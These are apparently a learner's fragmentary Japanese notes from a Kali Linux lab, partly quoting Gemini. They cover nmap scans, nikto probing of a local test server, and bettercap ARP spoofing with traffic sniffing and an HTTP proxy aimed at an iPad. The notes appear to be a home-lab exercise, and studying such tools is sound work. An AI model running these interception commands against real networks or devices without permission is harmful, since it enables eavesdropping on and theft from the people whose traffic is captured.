                # 例：自分のネットワーク(192.168.1.0/24など)をスキャン
                sudo nmap -sV 192.168.x.x
                sudo: nmap: command not found


                1. 全ポート（65535個）をスキャンする
                デフォルトの nmap は主要な「よく使われる1000個」のポートしか調べません。隠れたポートでサービスが動いている可能性があります。

                Bash
                sudo nmap -p- -sV 192.168.128.130
                sudo nmap -p 8000 -sV 192.168.128.130
                -p 1から65535までをスキャンする -sVはTCP
                -sUはUDP
                sudo nmap -sU --top-ports 20 192.168.128.130


                3. OSの指針やスクリプトスキャンを試す
                相手がどんなOS（LinuxなのかWindowsなのか）で動いているか、標準的な脆弱性がないかを探ります。

                Bash
                sudo nmap -A 192.168.128.130
                -A: OS検出、バージョン検出、スクリプトスキャン、トレースルートをまとめて行う「アグレッシブ」モードです。


                Gemini の回答
                全ポートスキャン（-p-）の結果、65,535個すべてのポートが closed でしたね。さらに、ip a の結果を見て非常に重要なことが分かりました。

                あなたがスキャンしている 192.168.128.130 は、今操作している Kali Linux 自身（自分自身）のIPアドレスです。

                eth0 の欄に inet 192.168.128.130/24 とありますよね。つまり、今あなたは「自分自身の家のドアが閉まっているか」を確認した状態です。何もサービス（WebサーバーやSSHなど）を立ち上げていなければ、すべて closed になるのは正常な動作です。

                実験を面白くするために、**「わざと自分のポートを開けて、それをスキャンで見つける」**という体験をしてみましょう！

                実験：自分のポートを「開けて」スキャンする
                1. 簡易的な Web サーバーを裏で立ち上げる
                Pythonを使って、一時的にポート 8000 番を開放します。

                Bash
                # 新しいターミナルを開くか、コマンドの最後に & を付けて実行
                & があるとバックグラウンドで実行できる
                python3 -m http.server 8000 &

                情報を抜き取る
                curl -I http://192.168.128.130:8000

                脆弱性を調べる
                nikto -h http://192.168.128.130:8000
                http://192.168.128.130:8000


                # ネットワーク内の通信している端末をスキャン
                sudo arp-scan -l

                # iPadのIPアドレスを -v の後に入れてください
                sudo tcpdump -i eth0 host 10.0.0.50 -n

                # ターゲットをiPadに絞る
                set arp.spoof.targets 10.0.0.50
                # ARPスプーフィング（中間者攻撃）を開始して通信を強制的にKali経由にする
                arp.spoof on
                # ログの全表示
                net.sniff on


                # eth0 ではなく、iPadと同じネットワークの自分のIP (10.0.0.1) を直接指定
                sudo bettercap -iface 10.0.0.1

                ターゲット（iPad）を直接指定

                Plaintext
                set arp.spoof.targets 10.0.0.50
                ARPスプーフィング開始

                Plaintext
                arp.spoof on
                パケット監視開始

                Plaintext
                net.sniff on
                なぜこれで解決するのか？

                # 現在のターゲット設定を解除して、10.0.0.0 の範囲を探索
                set net.probe.range 10.0.0.0/24
                set net.probe.range 10.0.0.1-10.0.0.254
                net.probe on

                # しばらく待ってから、デバイス一覧を確認
                net.show


                # HTTPプロキシを起動
                http.proxy on
                # 通信を流す
                net.sniff on


                一度プロキシを完全に停止

                Plaintext
                http.proxy off
                ポートを「8081」に変更（ここがポイント）

                Plaintext
                set http.proxy.port 8081
                再度プロキシを起動

                Plaintext
                http.proxy on

                # 1. 一旦プロキシを止める
                http.proxy off

                # 2. 待ち受けるIPを強制的に 10.0.0.1 に固定する
                set http.proxy.address 10.0.0.1

                # 3. もう一度プロキシを起動
                http.proxy on

                net.sniff on        